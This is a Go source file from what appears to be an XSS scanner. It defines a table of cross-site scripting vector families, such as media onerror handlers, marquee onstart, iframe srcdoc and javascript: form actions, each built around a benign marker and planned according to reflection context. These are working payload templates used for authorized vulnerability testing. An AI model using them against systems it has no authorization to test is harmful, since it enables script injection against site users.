package detection

// The cheat-sheet library: vector families the canonical planner does not carry.
//
// PortSwigger's XSS cheat sheet groups vectors by the mechanism that makes the
// browser run them: an event handler on a tag that fires on load, an event
// handler that needs one interaction, a javascript: URL, and so on. The
// canonical planner (htmlTextTemplates and friends) carries the small set the
// academy labs needed; this table adds the rest of the FAMILIES, one entry per
// mechanism, so a real target that blocks the common tags still has a plausible
// next step.
//
// Every entry follows the same rules as the canonical set:
//
//   - the payload carries the benign marker, never alert()/prompt()/confirm();
//   - it declares the reflection contexts that can carry it, so it is only
//     planned where it can actually land;
//   - it declares its trigger class (load vs interaction), which is what the
//     verifier needs to know before it can prove execution;
//   - it declares the canary characters it needs, so a site that provably
//     encodes them does not waste a request on it.
//
// The table is a data source, not a second planner: PlanCandidates still decides
// what is planned, the profile still caps how many are sent, and only a browser
// execution signal still confirms a finding.

import "fmt"

// LibraryVector is one cheat-sheet family, expressed as a template.
type LibraryVector struct {
	// ID names the family (used in rationale text and tests).
	ID string
	// Contexts lists the reflection contexts this vector can be carried in.
	Contexts []Context
	// Trigger is TriggerLoad or TriggerInteraction.
	Trigger string
	// Needs is the canary character set the vector requires to parse.
	Needs string
	// Build produces the payload with the marker embedded.
	Build func(marker string) string
	// Why explains the mechanism in one line.
	Why string
}

// Library is the cheat-sheet family table. Add entries here, not to the planner,
// and only for families the canonical set (candidate.go) does NOT already carry:
// a duplicate would spend a request on a shape the planner already sent.
var Library = []LibraryVector{
	{
		ID: "video_source_onerror", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
		Build: func(m string) string { return fmt.Sprintf(`<video><source onerror=%s>`, m) },
		Why:   "a video source that fails to load fires the handler without interaction",
	},
	{
		ID: "audio_onerror", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
		Build: func(m string) string { return fmt.Sprintf(`<audio src=x onerror=%s>`, m) },
		Why:   "a media element with an unreachable source fires onerror while loading",
	},
	{
		ID: "marquee_onstart", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
		Build: func(m string) string { return fmt.Sprintf(`<marquee onstart=%s>`, m) },
		Why:   "marquee fires onstart while parsing, before any interaction",
	},
	{
		ID: "iframe_srcdoc", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=\"",
		Build: func(m string) string { return fmt.Sprintf(`<iframe srcdoc="<audio src=x onerror=%s>"></iframe>`, m) },
		Why:   "srcdoc is parsed as its own document, so the inner handler runs on load",
	},
	{
		ID: "form_action_jsurl", Contexts: []Context{CtxHTMLText}, Trigger: TriggerInteraction, Needs: "t>=\"",
		Build: func(m string) string { return fmt.Sprintf(`<form action=javascript:%s><input type=submit>`, m) },
		Why:   "a submitted form navigates to the javascript: action; needs the verifier's click",
	},
	{
		ID: "button_formaction_jsurl", Contexts: []Context{CtxHTMLText}, Trigger: TriggerInteraction, Needs: "t>=\"",
		Build: func(m string) string { return fmt.Sprintf(`<button formaction=javascript:%s>x</button>`, m) },
		Why:   "formaction overrides the form target for the submit; needs the verifier's click",
	},
}

// libraryTemplatesFor returns the library families that can land in this
// context, as ordinary candidate templates (so the profile, ordering and
// verification paths treat them exactly like the canonical set).
func libraryTemplatesFor(a ContextAnalysis, m string) []candTemplate {
	var out []candTemplate
	for _, v := range Library {
		if !vectorFitsContext(v, a.Context) {
			continue
		}
		// Below every canonical candidate: the library is a TOP-UP, so a
		// profile that caps candidates (minimal 3, standard 8) still spends
		// its budget on the canonical set first and reaches the library only
		// when the operator asked for it (typically with -candidate-profile
		// thorough).
		priority := 40
		if v.Trigger == TriggerInteraction {
			priority = 45
		}
		build := v.Build
		value := build(m)
		out = append(out, candTemplate{
			value:     value,
			needs:     v.Needs,
			priority:  priority,
			rationale: "library/" + v.ID + ": " + v.Why,
			trigger:   v.Trigger,
			strict:    false,
		})
	}
	return out
}

func vectorFitsContext(v LibraryVector, c Context) bool {
	for _, want := range v.Contexts {
		if want == c {
			return true
		}
	}
	return false
}
